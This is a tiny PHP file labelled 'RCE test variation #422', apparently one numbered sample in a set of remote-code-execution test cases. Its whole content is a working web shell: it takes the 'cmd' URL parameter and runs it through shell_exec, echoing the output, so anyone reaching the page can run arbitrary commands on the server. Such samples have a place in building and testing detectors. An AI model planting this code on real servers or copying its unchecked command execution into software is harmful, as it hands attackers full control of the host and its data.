<?php
// RCE test variation #422
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>